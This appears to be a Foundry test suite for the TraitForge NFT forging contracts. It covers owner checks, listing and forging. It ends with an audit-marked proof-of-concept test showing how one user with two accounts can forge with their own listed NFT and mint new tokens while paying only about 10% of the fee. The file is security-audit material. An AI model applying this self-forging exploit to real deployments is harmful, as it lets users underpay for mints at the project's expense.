// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, console} from "forge-std/Test.sol"; 

import {EntityForging} from "../../contracts/EntityForging/EntityForging.sol"; 
import {IEntityForging} from "../../contracts/EntityForging/IEntityForging.sol"; 
import {TraitForgeNft} from "../../contracts/TraitForgeNft/TraitForgeNft.sol"; 
import {ITraitForgeNft} from "../../contracts/TraitForgeNft/ITraitForgeNft.sol"; 
import {EntropyGenerator} from "../../contracts/EntropyGenerator/EntropyGenerator.sol"; 
import {IEntropyGenerator} from "../../contracts/EntropyGenerator/IEntropyGenerator.sol";
import {Airdrop} from "../../contracts/Airdrop/Airdrop.sol"; 
import {IAirdrop} from "../../contracts/Airdrop/IAirdrop.sol"; 
import {EntityTrading} from "../../contracts/EntityTrading/EntityTrading.sol"; 
import {IEntityTrading} from "../../contracts/EntityTrading/IEntityTrading.sol";
import {NukeFund} from "../../contracts/NukeFund/NukeFund.sol"; 
import {INukeFund} from "../../contracts/NukeFund/INukeFund.sol"; 
import {DevFund} from "../../contracts/DevFund/DevFund.sol"; 
import {IDevFund} from "../../contracts/DevFund/IDevFund.sol"; 
import {DAOFund} from "../../contracts/DAOFund/DAOFund.sol"; 
import {IDAOFund} from "../../contracts/DAOFund/IDAOFund.sol";

contract EntityForgingTest is Test {

address public owner; 

EntityForging public entityForging; 

TraitForgeNft public traitForgeNft; 

EntropyGenerator public entropyGenerator; 

Airdrop public airdropContract; 

EntityTrading public entityTrading; 

DevFund public devFund; 

DAOFund public daoFund; 

NukeFund public nukeFund;

function setUp() public {
owner = address(this); 
traitForgeNft = new TraitForgeNft(); 
airdropContract = new Airdrop(); 
entityForging = new EntityForging(address(traitForgeNft)); 
entropyGenerator = new EntropyGenerator(address(traitForgeNft)); 
entityTrading = new EntityTrading(address(traitForgeNft));
devFund = new DevFund(); 
daoFund = new DAOFund(address(123), address(123)); 
nukeFund = new NukeFund(address(traitForgeNft), address(airdropContract), payable(address(devFund)), payable(address(daoFund)));
}

function invariant_nftContract() public view {
ITraitForgeNft _traitForgeNft = entityForging.nftContract(); 
assertEq(address(_traitForgeNft), address(traitForgeNft)); 
}

//setNukeFundAddress
function test_setNukeFundAddressNotTheOwner() public {
vm.startPrank(address(1312)); 
vm.expectRevert();
entityForging.setNukeFundAddress(payable(address(1231)));
}

function test_setNukeFundAddressWorks() public {
vm.startPrank(owner); 
entityForging.setNukeFundAddress(payable(address(1213)));
assertEq(entityForging.nukeFundAddress(), payable(address(1213))); 
}

//setTaxCut
function test_setTaxCutNotTheOwner() public {
vm.startPrank(address(3231)); 
vm.expectRevert(); 
entityForging.setTaxCut(10);
}

function test_setTaxCutWorks(uint256 number) public {
vm.startPrank(owner); 
number = bound(number, 0, type(uint256).max); 
entityForging.setTaxCut(number);
assertEq(entityForging.taxCut(), number); 
}

//setOneYearInDays
function test_setOneYearInDayNotTheOwner() public {
vm.startPrank(address(1213)); 
vm.expectRevert(); 
entityForging.setOneYearInDays(364);
}

function test_setOneYearInDayWorks(uint256 number) public {
vm.startPrank(owner); 
number = bound(number, 0, type(uint256).max); 
entityForging.setOneYearInDays(number);
assertEq(entityForging.oneYearInDays(), number); 
}

//setMinimumListingFee
function test_setMinimumListingFeeNotTheOwner() public {
vm.startPrank(address(121)); 
vm.expectRevert();
entityForging.setMinimumListingFee(10 ether);
}

function test_setMinimumListingFeeWorks(uint256 number) public {
vm.startPrank(owner); 
number = bound(number, 0, type(uint256).max); 
entityForging.setMinimumListingFee(number);
assertEq(entityForging.minimumListFee(), number); 
}

//listForForging
function test_listForForging() public {
vm.startPrank(owner); 
traitForgeNft.setEntityForgingContract(address(entityForging));
traitForgeNft.setAirdropContract(address(airdropContract));
traitForgeNft.setEntropyGenerator(address(entropyGenerator));
airdropContract.transferOwnership(address(traitForgeNft));
entropyGenerator.writeEntropyBatch1();
vm.stopPrank(); 

address user1 = address(123); 
deal(user1, 1 ether); 
vm.startPrank(user1); 
skip(2 days);
bytes32[] memory proof = new bytes32[](1); 
proof[0] = keccak256(abi.encode("Hi")); 
traitForgeNft.mintToken{value: 0.005 ether}(proof);
traitForgeNft.mintToken{value: 0.005 ether + 0.0000245 ether}(proof);
traitForgeNft.mintToken{value: 0.005 ether + (0.0000245 ether * 2)}(proof);
traitForgeNft.mintToken{value: 0.005 ether + (0.0000245 ether * 3)}(proof);
traitForgeNft.mintToken{value: 0.005 ether + (0.0000245 ether * 4)}(proof);
traitForgeNft.mintToken{value: 0.005 ether + (0.0000245 ether * 5)}(proof);

entityForging.listForForging(5, 0.02 ether);
assertEq(entityForging.listingCount(), 1); 
assertEq(entityForging.getListedTokenIds(5), 1); 
}

//forgeWithListed
function test_forgeWithListed() public {
vm.startPrank(owner); 
traitForgeNft.setEntityForgingContract(address(entityForging));
traitForgeNft.setAirdropContract(address(airdropContract));
traitForgeNft.setEntropyGenerator(address(entropyGenerator));
airdropContract.transferOwnership(address(traitForgeNft));
entropyGenerator.writeEntropyBatch1();
vm.stopPrank(); 

address user1 = address(123); 
address user2 = address(124); 
deal(user1, 1 ether); 
deal(user2, 1 ether); 
vm.startPrank(user1); 
skip(2 days);
bytes32[] memory proof = new bytes32[](1); 
proof[0] = keccak256(abi.encode("Hi")); 
vm.stopPrank(); 

vm.startPrank(user2); 
traitForgeNft.mintToken{value: 0.005 ether}(proof);
traitForgeNft.mintToken{value: 0.005 ether + 0.0000245 ether}(proof);
traitForgeNft.mintToken{value: 0.005 ether + (0.0000245 ether * 2)}(proof);
traitForgeNft.mintToken{value: 0.005 ether + (0.0000245 ether * 3)}(proof);
vm.stopPrank();

vm.startPrank(user1); 
traitForgeNft.mintToken{value: 0.005 ether + (0.0000245 ether * 4)}(proof);

entityForging.listForForging(5, 0.01 ether);
vm.stopPrank(); 

vm.startPrank(user2); 
entityForging.forgeWithListed{value: 0.01 ether}(5, 2);

assertEq(user1.balance, 1 ether - (0.005 ether + (0.0000245 ether * 4)) + (0.01 ether * 90) / 100); 
assertEq(user2.balance, 1 ether - 0.005 ether -  (0.005 ether + 0.0000245 ether) - (0.005 ether + (0.0000245 ether * 2)) - (0.005 ether + (0.0000245 ether * 3))  - 0.01 ether); 

assertEq(traitForgeNft.isApprovedOrOwner(user1, 5), true); 
assertEq(traitForgeNft.isApprovedOrOwner(user2, 2), true); 
}


//@audit-high, the same person could mint (with two or more differents accounts) a forger nft and a merger nft
// if this happens, the user can list the forger and buy it with the merger nft, paying only 10% (because 90% returns to himself and 10% are fees). 
// By doing so he can mint for free (only paying the 10 % of the forger list) new nfts. 
// Let's imagine a scenario when minting an nfts costs 0.01 ETH, the user can list his forger nft at 0.01 ETH and instantly buy it with a merger nft. 
// Result: He will be able to mint a new nft only by paying 0.001 ETH!
function test_vulnerability_peopleCanMintNFTSPayingWayLess () public {
vm.startPrank(owner); 
traitForgeNft.setEntityForgingContract(address(entityForging));
traitForgeNft.setAirdropContract(address(airdropContract));
traitForgeNft.setEntropyGenerator(address(entropyGenerator));
airdropContract.transferOwnership(address(traitForgeNft));
entityTrading.setNukeFundAddress(payable(address(nukeFund)));
entropyGenerator.writeEntropyBatch1();
vm.stopPrank(); 

address user1Account1 = address(123); 
address user1Account2 = address(124); 
deal(user1Account1, 1 ether); 
deal(user1Account2, 1 ether); 

skip(2 days);
bytes32[] memory proof = new bytes32[](1); 
proof[0] = keccak256(abi.encode("Hi")); 

vm.startPrank(user1Account2); 
traitForgeNft.mintToken{value: 0.005 ether}(proof);
traitForgeNft.mintToken{value: 0.005 ether + 0.0000245 ether}(proof);
traitForgeNft.mintToken{value: 0.005 ether + (0.0000245 ether * 2)}(proof);
traitForgeNft.mintToken{value: 0.005 ether + (0.0000245 ether * 3)}(proof);
vm.stopPrank();

vm.startPrank(user1Account1); 
traitForgeNft.mintToken{value: 0.005 ether + (0.0000245 ether * 4)}(proof);

uint256 forgingFee = 0.01 ether; 
entityForging.listForForging(5, forgingFee); //User with account 1 list the forger nft 

vm.stopPrank(); 

vm.startPrank(user1Account2); //User with account 2 forge the merger nft with the forger nft
entityForging.forgeWithListed{value: forgingFee}(5, 2);

assertEq(traitForgeNft.ownerOf(5), user1Account1); //After, Account 1 keeps to have the forger nft
assertEq(traitForgeNft.ownerOf(2), user1Account2); //After, Account 2 keeps to have the merger nft
assertEq(traitForgeNft.ownerOf(6), user1Account2); //After, Account 2 has also the new minted nft
}


}